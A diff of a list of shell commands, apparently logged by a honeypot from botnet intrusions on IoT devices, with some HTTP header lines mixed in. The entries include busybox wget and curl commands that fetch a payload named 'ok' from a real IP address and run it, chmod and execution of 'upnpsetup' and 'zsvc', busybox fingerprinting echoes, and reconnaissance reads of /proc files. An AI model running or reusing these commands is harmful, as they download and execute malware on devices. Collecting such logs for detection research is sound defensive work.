@@ -47,6 +47,7 @@ PING
 busybox curl -O http://5.182.210.174/ok
 busybox sh ok
 busybox wget http://5.182.210.174/ok
+cat /proc/cpuinfo
 cd /dev
 cd /var/tmp
 chmod +x ok
@@ -59,7 +60,6 @@ rm -rf ok.1
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x58\x4d\x4f\x4f\x51'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x59\x51\x50\x47\x51'
 Accept-Encoding: gzip
-cat /proc/cpuinfo
 echo Hi | cat -n
 g & k | zpkfq
 ifconfig
@@ -79,6 +79,7 @@ zpz}ld
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x51\x41\x47\x47\x52\x4e'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x51\x4c\x59\x4b\x49\x44'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x58\x41\x50\x45\x43\x43'
+echo SHELL_TEST
 ./upnpsetup
 /bin/busybox TEST
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x52\x50\x47\x4e\x43'
@@ -102,7 +103,6 @@ zpz}ld
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x58\x4c\x55\x57\x42\x4e'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x58\x52\x4b\x4f\x4c\x4a'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x53\x59\x52\x41\x54'
-echo SHELL_TEST
 sudo ./upnpsetup
 ./zsvc
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x42\x52\x4a\x55\x49'
@@ -157,10 +157,15 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
 cat /proc/cpuinfo|grep name|cut -f2 -d':'|uniq -c ; uname -a
 cat /proc/mounts; /bin/busybox DCLDN
+cat /proc/mtd
+cat /proc/net/arp
+cat /proc/sys/kernel/hostname
+cat /proc/uptime
 chmod 777 upnpsetup
 chmod 777 zsvc
 echo 'dGVzdA==' | base64 -d 2>/dev/null
 echo 1 > /dev/null && cat /bin/echo
+echo TIMING_CHECK
 hostname
 sudo ./zsvc
 uname -m&&pkill upnpsetup
